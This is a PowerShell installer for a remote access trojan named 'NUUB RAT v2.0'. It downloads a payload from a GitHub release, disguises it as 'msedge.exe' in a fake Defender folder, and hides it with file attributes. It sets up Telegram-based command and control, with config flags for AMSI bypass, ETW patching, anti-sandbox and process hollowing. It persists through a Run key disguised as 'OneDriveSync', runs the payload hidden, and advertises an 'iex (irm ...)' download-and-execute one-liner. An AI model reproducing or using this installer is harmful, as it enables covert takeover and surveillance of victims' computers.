<#
.SYNOPSIS
    NUUB RAT v2.0 - Silent Installer
.DESCRIPTION
    Silent installation with no visible windows, process disguise, and encrypted config.
    All evasion techniques are enabled by default.
.USAGE
    # Interactive wizard:
    .\install-silent.ps1

    # Silent mode (parameters):
    .\install-silent.ps1 -BotToken "123:ABC" -AdminId "123456" -PcId "PC-01"

    # Remote one-line install:
    iex (irm https://github.com/AnderMC66/NUUB-VERSION-2/releases/latest/download/install-silent.ps1)
#>

param(
    [string]$BotToken = "",
    [string]$AdminId = "",
    [string]$PcId = "PC-001",
    [string]$EncPassword = "",
    [int]$Heartbeat = 30,
    [switch]$Silent
)

$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ═══════════════════════════════════════════════════════════════
#  HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════

function New-RandomString {
    param([int]$Length = 24)
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*'
    return -join ((0..$Length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
}

function Read-Input {
    param([string]$Prompt, [string]$Default = "", [switch]$Secret)
    if ($Default) { $display = "${Prompt} [${Default}]: " } else { $display = "${Prompt}: " }
    if ($Secret) {
        $secure = Read-Host $display -AsSecureString
        $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
        $value = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
    } else {
        $value = Read-Host $display
    }
    if (-not $value -and $Default) { return $Default }
    return $value
}

function Read-YesNo {
    param([string]$Prompt, [bool]$Default = $false)
    if ($Default) { $def = "Y/n" } else { $def = "y/N" }
    $value = Read-Host "${Prompt} ($def)"
    if (-not $value) { return $Default }
    return ($value -eq 'y' -or $value -eq 'yes')
}

function Write-Info { param([string]$Msg) Write-Host "[INFO] ${Msg}" -ForegroundColor DarkYellow }
function Write-OK { param([string]$Msg) Write-Host "[OK] ${Msg}" -ForegroundColor Green }
function Write-Err { param([string]$Msg) Write-Host "[ERROR] ${Msg}" -ForegroundColor Red }

# ═══════════════════════════════════════════════════════════════
#  MAIN INSTALLATION
# ═══════════════════════════════════════════════════════════════

# ── 1. Create hidden installation directory ──
$installDir = Join-Path $env:APPDATA "Microsoft\Windows\ defender"
New-Item -ItemType Directory -Force -Path $installDir | Out-Null

# ── 2. Download static executable ──
$exeName = "msedge.exe"
$exePath = Join-Path $installDir $exeName
$configName = "config.dat"
$configPath = Join-Path $installDir $configName

Write-Info "Downloading agent..."

$url = "https://github.com/AnderMC66/NUUB-VERSION-2/releases/latest/download/nuub.exe"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

try {
    $wc.DownloadFile($url, $exePath)
} catch {
    Write-Err "Download failed: $_"
    exit 1
}

# Hide file (system + hidden attributes)
attrib +S +H $exePath

# ── 3. Configuration wizard or silent parameters ──
if (-not $Silent) {
    Write-Host "`n=== NUUB RAT Configuration ===`n" -ForegroundColor Cyan

    if (-not $BotToken) {
        $BotToken = Read-Input "Bot Token (@BotFather)" -Secret
    }
    if (-not $AdminId) {
        $AdminId = Read-Input "Admin Chat ID"
    }
    $PcId = Read-Input "PC Identifier" $PcId
    $Heartbeat = [int](Read-Input "Heartbeat interval (minutes)" "$Heartbeat")

    $useEnc = Read-YesNo "Encrypt config on disk?" $true
    if ($useEnc -and -not $EncPassword) {
        $EncPassword = Read-Input "Encryption password (empty = random)" -Secret
        if (-not $EncPassword) { $EncPassword = New-RandomString 24 }
    }
} else {
    # Silent mode validation
    if (-not $BotToken -or -not $AdminId) {
        Write-Err "Silent mode requires -BotToken and -AdminId"
        exit 1
    }
    if (-not $EncPassword) { $EncPassword = New-RandomString 24 }
}

# ── 4. Generate config.json content ──
$configObj = @{
    telegram_bot_token = $BotToken
    admin_chat_ids = @([long]$AdminId)
    pc_identifier = $PcId
    encryption_password = $EncPassword
    log_filename = "null.log"
    master_log_filename = "null.log"
    activity_log_filename = "null.csv"
    audit_log_filename = "null.log"
    auto_start_entry_name = "OneDriveSync"
    heartbeat_interval_minutes = $Heartbeat
    stealth_mode = $true
    anti_debug = $true
    anti_vm = $true
    anti_sandbox = $true
    etw_patch = $true
    amsi_bypass = $true
    process_hollowing = $true
    module_stomping = $false
    direct_syscall = $true
    environment_keying = $true
    anti_forensic = $false
    c2_encryption_key = ""
}

$jsonStr = $configObj | ConvertTo-Json

# ── 5. Save config (plaintext - encrypted by agent on first run) ──
$jsonStr | Out-File $configPath -Encoding UTF8
attrib +S +H $configPath

# ── 6. Set environment variable for config decryption ──
[Environment]::SetEnvironmentVariable("NUUB_CONFIG_KEY", $EncPassword, "User")
$env:NUUB_CONFIG_KEY = $EncPassword

# ── 7. Silent persistence via Registry Run key ──
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regValue = "`"$exePath`" --config `"$configPath`""
Set-ItemProperty -Path $regPath -Name "OneDriveSync" -Value $regValue

# ── 8. Execute agent silently (no window) ──
Start-Process -FilePath $exePath -ArgumentList "--config `"$configPath`"" -WindowStyle Hidden

Write-OK "Installation complete"
Write-Info "Location: $installDir"
Write-Info "Config: $configPath"
Write-Info "Persistence: Registry OneDriveSync"
